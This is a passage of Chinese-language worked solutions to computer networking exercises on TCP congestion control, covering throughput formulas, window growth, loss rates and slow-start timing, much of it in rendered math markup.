class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.195054em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90
l0 -0
c4,-6.7,10,-10,18,-10 H400000v40
H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7
s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744
c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30
c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722
c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5
c53.7,-170.3,84.5,-266.8,92.5,-289.5z
M1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.604946em;"><span></span></span></span></span></span></span></span></span>。平均速率应该为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mfrac><mrow><mn>3</mn><mi>W</mi></mrow><mn>2</mn></mfrac><mo stretchy="false">(</mo><mfrac><mi>W</mi><mn>2</mn></mfrac><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mrow><mn>2</mn><mo stretchy="false">(</mo><mfrac><mi>W</mi><mn>2</mn></mfrac><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></mfrac><mo>=</mo><mfrac><mrow><mn>3</mn><mi>W</mi></mrow><mrow><mn>4</mn><mi mathvariant="normal">RTT</mi><mo>⁡</mo></mrow></mfrac><mo>≈</mo><mfrac><mn>1.22</mn><msqrt><mi>L</mi></msqrt></mfrac></mrow><annotation encoding="application/x-tex">\frac{\frac{3W}{2}(\frac{W}{2}+1)}{2(\frac{W}{2}+1)}=\frac{3W}{4\operatorname{RTT}}\approx\frac{1.22}{\sqrt{L}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.82253em;vertical-align:-0.661265em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.161265em;"><span style="top:-2.579535em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8720928571428572em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.5508em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8720928571428572em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mopen mtight">(</span><span class="mord mtight"><span class="mopen nulldelimiter sizing reset-size3 size6"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8720928571428572em;"><span style="top:-2.656em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.2255000000000003em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line mtight" style="border-bottom-width:0.049em;"></span></span><span style="top:-3.384em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.344em;"><span></span></span></span></span></span><span class="mclose nulldelimiter sizing reset-size3 size6"></span></span><span class="mbin mtight">+</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.661265em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mop mtight"><span class="mord mathrm mtight">R</span><span class="mord mathrm mtight">T</span><span class="mord mathrm mtight">T</span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.383108em;vertical-align:-0.538em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.537397em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322900000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mathnormal mtight">L</span></span></span><span style="top:-2.89229em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.10770999999999997em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">.</span><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.538em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。其中<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mn>3</mn><mi>W</mi></mrow><mn>4</mn></mfrac></mrow><annotation encoding="application/x-tex">\frac{3W}{4}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">4</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">3</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>是一个周期平均传输的分组数量。</li>
<li>a. 这条TCP连接取得最大窗口长度时，该链路处于满负荷状态。一个RTT是150ms，因此10Mbps=x×1500×8/RTT，求得x=125。<br />
b. 这条连接的平均窗口长度为：(125+125/2)/2=94个报文段，平均吞吐量为94×1500×8/0.15=7.52Mbps。<br />
c. 从丢包恢复之后，再一次到达最大窗口一共经历了x-x/2个RTT，即63个RTT，即9.45s。</li>
<li>发送方和接收方之间的链路速率与双向传播时延之积，实际上就等于链路在一个时刻正在传输的最大的分组数量（将链路速率的单位设置为分组数量而不是比特数量）。在前一题中，在出现丢包的时候，cwnd减半，容易发现减半之后链路并没有满负荷工作。现在链路出现了缓存，当发送方的发送速率小于链路的带宽时，缓存可以同时发送分组使得链路保持饱和状态。这个缓存不能太短，否则会过早返回冗余ACK导致发送端暂缓传输（也就是该链路不忙于发送数据），所以必须足够大，大到一个RTT传输的数据量，这样，缓存区满时，再发送包会立刻引发重传。需要注意这里缓存的工作方式。如果发送方在一个RTT之内发送的数据大于一个RTT内能够传输的数据量，那么链路缓存将会缓存发送方最后发送的几个数据包，并使得在这个RTT时间内，发送方除去这几个数据包之外其他的数据包的数据量正好等于这个RTT内链路能够发送的最大数据量。在下一个RTT传输数据时，首先将缓存中的数据发送出去，然后发送发送方的前面一部分数据，再将这个RTT无法发送的数据包进行缓存。正因如此，当缓存满时，在一个RTT之内就会出现丢包的情况，发送方检测到冗余的ACK，将发送窗口减为一半，此时就需要将缓存中的数据包进行发送，逐渐减少缓存中的数据包数量以确保链路处于饱和状态。</li>
<li>a. 125000<br />
b. 7.5Gbps<br />
c. 156.25min，可以使用乘型增的方式增加。</li>
<li>由45题可知，使用RTT为单位度量的T与W有函数关系，即T=W/2，平均吞吐量=3W/4RTT，因此平均吞吐量可以用T表示。</li>
<li>a. 拥塞链路的带宽为每秒30个报文段，在时刻0，C1的数据速率为200个报文段/s，而C2为100，远远超过链路带宽，因此会减半，直到二者的拥塞窗口都为1时，数据速率等于链路速率。<br />
b. 不会。</li>
<li>a. 时刻1，C1=15，C2=10，产生拥塞。时刻2，C1=7，C2=5，产生拥塞。时刻3，C1=3，C2=2，产生拥塞。时刻4，C1=1，C2=1，不产生拥塞。时刻5，C1=2，C2=2，产生拥塞。之后偶数时刻等于时刻4的情况，奇数时刻等于时刻5的情况。在2200ms之后情况等于时刻4的情况，拥塞窗口为1。（2100ms~2200ms时产生拥塞）<br />
b. 会。<br />
c. 是。<br />
d. 不能。可以让两个连接交替拥塞，这样可以提高利用率。</li>
<li>这个乘型增的机制是当一个RTT内没有丢包事件发生时，窗口数量将乘以1+a。对于连续的几个RTT，记第一个RTT的编号为0，窗口长度为W/2，设最后一个RTT（编号为n）的窗口长度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>W</mi><mn>2</mn></mfrac><mo>×</mo><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><mi>a</mi><msup><mo stretchy="false">)</mo><mi>n</mi></msup><mo>=</mo><mi>W</mi></mrow><annotation encoding="application/x-tex">\frac{W}{2}\times (1+a)^n=W</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span></span>，W为链路最大传输速率（单位为分组数/RTT）。然后丢包，窗口变为一半。因此易得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><mi>a</mi><msup><mo stretchy="false">)</mo><mi>n</mi></msup><mo>=</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">(1+a)^n=2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">2</span></span></span></span>，这些RTT一共发送了<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mi>W</mi><mn>2</mn></mfrac><mo>×</mo><mfrac><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><mi>a</mi><msup><mo stretchy="false">)</mo><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow></msup><mo>−</mo><mn>1</mn></mrow><mi>a</mi></mfrac><mo>=</mo><mfrac><mi>W</mi><mn>2</mn></mfrac><mo>×</mo><mfrac><mrow><mn>2</mn><mi>a</mi><mo>+</mo><mn>1</mn></mrow><mi>a</mi></mfrac></mrow><annotation encoding="application/x-tex">\frac{W}{2}\times\frac{(1+a)^{n+1}-1}{a}=\frac{W}{2}\times\frac{2a+1}{a}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.4539199999999999em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10892em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">a</span><span class="mclose mtight"><span class="mclose mtight">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.217331em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.190108em;vertical-align:-0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">a</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">a</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>个分组，丢包率为其倒数：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mfrac><mrow><mn>2</mn><mi>a</mi></mrow><mrow><mo stretchy="false">(</mo><mn>1</mn><mo>+</mo><mn>2</mn><mi>a</mi><mo stretchy="false">)</mo><mi>W</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">L=\frac{2a}{(1+2a)W}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.365108em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.845108em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">1</span><span class="mbin mtight">+</span><span class="mord mtight">2</span><span class="mord mathnormal mtight">a</span><span class="mclose mtight">)</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">W</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mathnormal mtight">a</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。在这个体系中，TCP连接将其拥塞窗口长度从W/2增加到W的周期时间不变。</li>
<li>使用公式，一条连接的平均吞吐量=<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mn>1.22</mn><mi>M</mi><mi>S</mi><mi>S</mi></mrow><mrow><mi>R</mi><mi>T</mi><mi>T</mi><msqrt><mi>L</mi></msqrt></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{1.22MSS}{RTT\sqrt{L}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.410331em;vertical-align:-0.538em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.872331em;"><span style="top:-2.537397em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.00773em;">R</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span><span class="mord sqrt mtight"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322900000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mtight" style="padding-left:0.833em;"><span class="mord mathnormal mtight">L</span></span></span><span style="top:-2.89229em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail mtight" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702
c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14
c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54
c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10
s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429
c69,-144,104.5,-217.7,106.5,-221
l0 -0
c5.3,-9.3,12,-14,20,-14
H400000v40H845.2724
s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7
c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z
M834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.10770999999999997em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">.</span><span class="mord mtight">2</span><span class="mord mtight">2</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span><span class="mord mathnormal mtight" style="margin-right:0.05764em;">S</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.538em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>，取MSS=1500，RTT=100ms，求得L的值为2×10<sup>-12</sup>。</li>
<li>优点：可以略过慢启动和一部分拥塞避免的过程，可以让传输速率提升地更快。缺点：二者对于新的链路环境可能需要多次调整。建议可以增加链路缓存，让链路的使用情况变化地平缓一些。</li>
<li>a. 服务器将向Y发送响应，这个响应可能无法被收到。<br />
b. 可以确认。SYNACK将初始序号发送给了Y，其他人无法知道正确的初始序号。</li>
<li>a. S/R&lt;RTT&lt;3S/R</li>
</ol>
<p>|时刻|事件|窗口大小|剩余窗口大小|<br />
|:-😐:-😐:-😐:-😐:-😐<br />
|0|发送SYN|0|0|<br />
|1RTT|接收SYNACK|0|0|<br />
|1RTT+1S/R|发送分组1完毕|1|0|<br />
|2RTT+1S/R|接收ACK1|2|2|<br />
|2RTT+2S/R|发送分组2完毕|2|1|<br />
|2RTT+3S/R|发送分组3完毕|2|0|<br />
|3RTT+2S/R|接收ACK2|3|2|<br />
|3RTT+3S/R|发送分组4完毕，接收ACK3|4|3|<br />
|3RTT+4S/R|发送分组5完毕|4|2|</p>
<p>在此之后，分组6和7将分别在3RTT+5R/S和3RTT+6R/S被发送，而考虑到4RTT+3R/S&lt;3RTT+6R/S，因此ACK4先于分组7发送被接收，因此分组7发送完毕后窗口依然不为0，同理4RTT+4R/S&lt;3RTT+7R/S（分组8发送完成的时间），因此ACK5先于分组8发送被接收，由此之后的所有时刻窗口都不会为0，于是就一直发送。最终需要时间为4RTT+14R/S。</p>
<p>b. RTT&gt;3S/R</p>
<p>|时刻|事件|窗口大小|剩余窗口大小|<br />
|:-😐:-😐:-😐:-😐:-😐<br />
|0|发送SYN|0|0|<br />
|1RTT|接收SYNACK|0|0|<br />
|1RTT+1S/R|发送分组1完毕|1|0|<br />
|2RTT+1S/R|接收ACK1|2|2|<br />
|2RTT+2S/R|发送分组2完毕|2|1|<br />
|2RTT+3S/R|发送分组3完毕|2|0|<br />
|3RTT+2S/R|接收ACK2|3|2|<br />
